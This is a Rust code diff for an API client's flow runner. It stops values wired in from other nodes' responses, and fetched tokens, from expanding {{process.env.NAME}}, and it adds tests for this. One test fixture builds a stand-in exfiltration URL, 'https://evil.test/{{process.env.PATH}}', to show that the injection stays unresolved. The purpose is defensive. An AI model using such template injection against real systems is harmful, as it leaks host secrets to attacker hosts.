@@ -571,7 +571,9 @@ fn build_inline_request(label: &str, inline: &InlineRequestData) -> DomainResult
 /// - `"auth"` wires are applied by the `Request` arm before this function runs
 ///   and are skipped here, because they carry a credential rather than a value.
 ///
-/// A wired header is always enabled, so the wire takes effect. Any other
+/// A wired header is always enabled, so the wire takes effect. Every wired field is
+/// marked in `input.host_env_free`: its text came from another node, often a response,
+/// so it never resolves `{{process.env.NAME}}`. Any other
 /// path is a `DomainError` — never a silent no-op, since a wire the user drew
 /// that quietly does nothing would be far more confusing than a run that
 /// fails with a clear reason.
@@ -588,9 +590,10 @@ pub fn apply_wired_overrides(
         let applied = match e.target_field.as_str() {
             "url" => {
                 input.url = value.clone();
+                input.host_env_free.url = true;
                 Ok(())
             }
-            "body" => apply_body_override(input, value),
+            "body" => apply_body_override(input, value).map(|()| input.host_env_free.body = true),
             field => match field
                 .strip_prefix("headers[")
                 .and_then(|rest| rest.strip_suffix("].value"))
@@ -656,10 +659,16 @@ fn apply_header_override(
         })?;
         header.value = value.to_string();
         header.enabled = true;
+        let key = header.key.to_ascii_lowercase();
+        input.host_env_free.headers.insert(key);
         return Ok(());
     }
 
     let name = selector.trim();
+    input
+        .host_env_free
+        .headers
+        .insert(name.to_ascii_lowercase());
     match input
         .headers
         .iter_mut()
@@ -1721,6 +1730,11 @@ impl FlowExecutionService {
                 let mut auth_from: Option<String> = credentials
                     .apply_to_inherit(&mut request_input.auth)
                     .map(str::to_string);
+                // A fetched or supplied token came from a token response, so it never
+                // resolves `{{process.env.NAME}}`. A static Auth node is authored text.
+                request_input.host_env_free.auth = auth_from
+                    .as_deref()
+                    .is_some_and(|id| credentials.is_fetched_token(id));
 
                 let mut resolved = HashMap::new();
                 for edge in data_edges {
@@ -1739,6 +1753,8 @@ impl FlowExecutionService {
                             return Err(fail_wire(trace, edge, e, &trace_masks));
                         };
                         request_input.auth = credential.clone();
+                        request_input.host_env_free.auth =
+                            credentials.is_fetched_token(&edge.source_node_id);
                         auth_from = Some(edge.source_node_id.clone());
                         continue;
                     }
@@ -1996,14 +2012,26 @@ fn send_time_credential_value(
     external_secrets: &HashMap<String, String>,
 ) -> Option<String> {
     let template = crate::flow_auth::credential_template(&request_input.auth)?;
-    // The send resolves `{{process.env.NAME}}` too, so the mask must match it.
-    let mut vars = exec.build_variable_context_with_process_env(
-        request_input.global_env_name.as_deref(),
-        request_input.collection.as_deref(),
-        request_input.environment_name.as_deref(),
-        request_input.request_path.as_deref(),
-        external_secrets,
-    );
+    // The send resolves `{{process.env.NAME}}` in the credential too, unless a token
+    // response filled it, so the mask matches what is sent.
+    let host_env = request_input.backend_process_env && !request_input.host_env_free.auth;
+    let mut vars = if host_env {
+        exec.build_variable_context_with_process_env(
+            request_input.global_env_name.as_deref(),
+            request_input.collection.as_deref(),
+            request_input.environment_name.as_deref(),
+            request_input.request_path.as_deref(),
+            external_secrets,
+        )
+    } else {
+        exec.build_variable_context(
+            request_input.global_env_name.as_deref(),
+            request_input.collection.as_deref(),
+            request_input.environment_name.as_deref(),
+            request_input.request_path.as_deref(),
+            external_secrets,
+        )
+    };
     vars.extend(request_input.flow_vars.clone());
     crate::flow_auth::resolve_fully(template, &vars).filter(|value| !value.is_empty())
 }
@@ -2638,6 +2666,7 @@ mod tests {
             run_secret_values: Default::default(),
             run_sent_credentials: Default::default(),
             run_process_env_values: Default::default(),
+            process_env_withheld: false,
         }
     }
 
@@ -10148,8 +10177,8 @@ mod tests {
     async fn static_bearer_from_process_env_is_masked_in_the_trace() {
         use rocket_shared::types::Auth;
 
-        // A unique name, so parallel tests do not collide.
-        std::env::set_var("ROCKET_T2_TOKEN", "os-token-abcdef123456");
+        // `PATH` is always set, so no test has to change the process environment.
+        let os_path = std::env::var("PATH").expect("PATH is set");
         let env = Arc::new(std::sync::Mutex::new(env_with(&[])));
         let executor = LoginEchoExecutor::new(&env, "unused");
         let exec = RequestExecutionService::new(
@@ -10170,7 +10199,7 @@ mod tests {
         .with_trust_store(crate::test_doubles::InMemoryTrustStore::allow_all());
         let service = template_auth_service(
             Auth::Bearer {
-                token: "{{process.env.ROCKET_T2_TOKEN}}".to_string(),
+                token: "{{process.env.PATH}}".to_string(),
             },
             false,
         );
@@ -10180,11 +10209,214 @@ mod tests {
         assert_eq!(
             executor.sent_auths().last(),
             Some(&Auth::Bearer {
-                token: "os-token-abcdef123456".to_string()
+                token: os_path.clone()
             }),
             "the request sends the resolved token"
         );
-        assert_masked_in_run_output(&summary, "os-token-abcdef123456");
+        assert_masked_in_run_output(&summary, &os_path);
+        // Only the send-time value of the credential puts it in the masks a partial run reuses.
+        let cached = service
+            .run_cache
+            .lock()
+            .expect("lock cache")
+            .get(&summary.run_id)
+            .expect("the run is cached");
+        assert!(
+            cached.masking_secrets.contains(&os_path),
+            "the send-time credential value is kept for partial runs"
+        );
+    }
+
+    /// An exec whose trust gate allows the host environment, sending through `executor`.
+    fn host_env_exec(executor: &Arc<RecordingExecutor>) -> RequestExecutionService {
+        RequestExecutionService::new(
+            Box::new(NullEnvRepo),
+            Arc::new(SharedExecutor(Arc::clone(executor))),
+            Box::new(NullHistoryRepo),
+            Box::new(crate::test_doubles::SharedCollectionRepo(
+                crate::test_doubles::InMemoryCollectionRepo::new(
+                    rocket_collection::Collection::new("my-api"),
+                ),
+            )),
+            Box::new(NullCookieRepo),
+            Box::new(NullEventPublisher),
+            Box::new(EmptySecretManagerRepo),
+            Arc::new(rocket_environment::NullSecretStore),
+            Arc::new(rocket_environment::NullVaultSecretFetcher),
+        )
+        .with_trust_store(crate::test_doubles::InMemoryTrustStore::allow_all())
+        .with_script_engine(Box::new(rocket_infra::scripting::DenoScriptEngine::new()))
+    }
+
+    #[tokio::test]
+    async fn wired_values_never_resolve_process_env() {
+        let attack = "https://evil.test/{{process.env.PATH}}";
+        let flow = Flow {
+            name: "wired".to_string(),
+            nodes: vec![
+                request_flow_node("a", "https://api.example.com/a"),
+                request_flow_node("b", "https://api.example.com/b"),
+                request_flow_node("c", "https://api.example.com/c?p={{process.env.PATH}}"),
+            ],
+            edges: vec![
+                wire("e1", "a", "b"),
+                FlowEdge {
+                    target_field: "headers[X-Wired].value".to_string(),
+                    ..wire("e2", "a", "b")
+                },
+            ],
+            callback_host: None,
+        };
+        let executor = RecordingExecutor::new();
+        executor.set_body("api.example.com/a", attack);
+        let exec = host_env_exec(&executor);
+        let service = FlowExecutionService::new(
+            Box::new(FakeFlowRepository::new().with_flow("my-api", flow)),
+            Box::new(FakeCollectionRepo::new().build()),
+            Box::new(NullEventPublisher),
+        );
+
+        service.run(&exec, run_input("wired")).await.expect("run");
+
+        let os_path = std::env::var("PATH").expect("PATH is set");
+        let urls = executor.sent_urls();
+        assert!(urls.contains(&attack.to_string()), "{urls:?}");
+        // Text from the saved request still resolves.
+        assert!(
+            urls.contains(&format!("https://api.example.com/c?p={os_path}")),
+            "{urls:?}"
+        );
+        let index = urls.iter().position(|u| u == attack).expect("b was sent");
+        let wired = executor.sent_headers()[index]
+            .iter()
+            .find(|h| h.key == "X-Wired")
+            .map(|h| h.value.clone());
+        assert_eq!(wired.as_deref(), Some(attack));
+    }
+
+    /// A flow whose client-credentials Auth node fetches `{{process.env.PATH}}` as its
+    /// token, and a saved request `r` with `request_auth`. With no edges the node applies
+    /// to inherit; with edges it reaches `r` only through them.
+    fn fetched_token_service(
+        request_auth: rocket_shared::types::Auth,
+        edges: Vec<FlowEdge>,
+    ) -> FlowExecutionService {
+        use crate::flow_auth::test_support::{FakeFetcher, SharedFetcher};
+
+        let mut auth_node = client_credentials_auth_node("a");
+        if let FlowNodeKind::Auth {
+            apply_to_inherit, ..
+        } = &mut auth_node.kind
+        {
+            *apply_to_inherit = edges.is_empty();
+        }
+        let flow = Flow {
+            name: "auth-req".to_string(),
+            nodes: vec![auth_node, saved_flow_node("r", "req.yml")],
+            edges,
+            callback_host: None,
+        };
+        let mut saved = Request::new("Get", HttpMethod::Get, "https://api.example.com/x");
+        saved.runtime_auth = Some(request_auth);
+        FlowExecutionService::new(
+            Box::new(FakeFlowRepository::new().with_flow("my-api", flow)),
+            Box::new(
+                FakeCollectionRepo::new()
+                    .with_request("my-api", "req.yml", saved)
+                    .build(),
+            ),
+            Box::new(NullEventPublisher),
+        )
+        .with_token_fetcher(Box::new(SharedFetcher(FakeFetcher::ok(
+            "{{process.env.PATH}}",
+        ))))
+    }
+
+    #[tokio::test]
+    async fn a_fetched_auth_node_token_never_resolves_process_env() {
+        use rocket_shared::types::Auth;
+
+        let executor = RecordingExecutor::new();
+        let exec = host_env_exec(&executor);
+        let service = fetched_token_service(Auth::Inherit, Vec::new());
+
+        service
+            .run(&exec, run_input("auth-req"))
+            .await
+            .expect("run");
+
+        assert_eq!(
+            executor.sent_auths(),
+            vec![Auth::Bearer {
+                token: "{{process.env.PATH}}".to_string()
+            }]
+        );
+    }
+
+    #[tokio::test]
+    async fn a_wired_fetched_token_never_resolves_process_env() {
+        use rocket_shared::types::Auth;
+
+        let executor = RecordingExecutor::new();
+        let exec = host_env_exec(&executor);
+        let service = fetched_token_service(
+            Auth::Basic {
+                username: "own".to_string(),
+                password: "own".to_string(),
+            },
+            vec![auth_wire()],
+        );
+
+        service
+            .run(&exec, run_input("auth-req"))
+            .await
+            .expect("run");
+
+        assert_eq!(
+            executor.sent_auths(),
+            vec![Auth::Bearer {
+                token: "{{process.env.PATH}}".to_string()
+            }]
+        );
+    }
+
+    #[tokio::test]
+    async fn a_flow_step_with_a_withheld_value_warns_in_its_logs() {
+        let flow = Flow {
+            name: "withheld".to_string(),
+            nodes: vec![request_flow_node(
+                "r",
+                "https://api.example.com/{{process.env.ROCKET_M3_KEY}}",
+            )],
+            edges: Vec::new(),
+            callback_host: None,
+        };
+        let executor = RecordingExecutor::new();
+        // The gate is closed for this collection.
+        let exec = host_env_exec(&executor)
+            .with_trust_store(crate::test_doubles::InMemoryTrustStore::new());
+        let service = FlowExecutionService::new(
+            Box::new(FakeFlowRepository::new().with_flow("my-api", flow)),
+            Box::new(FakeCollectionRepo::new().build()),
+            Box::new(NullEventPublisher),
+        );
+
+        let summary = service
+            .run(&exec, run_input("withheld"))
+            .await
+            .expect("run");
+
+        assert_eq!(
+            executor.sent_urls(),
+            vec!["https://api.example.com/{{process.env.ROCKET_M3_KEY}}".to_string()]
+        );
+        let logs = &step_of(&summary, "r").logs;
+        let warnings: Vec<_> = logs
+            .iter()
+            .filter(|l| l.message.contains("was sent unresolved"))
+            .collect();
+        assert_eq!(warnings.len(), 1, "{logs:?}");
+        assert_eq!(warnings[0].level, FlowLogLevel::Warn);
     }
 
     /// The canonical Login flow: the environment holds a stale `token` from a
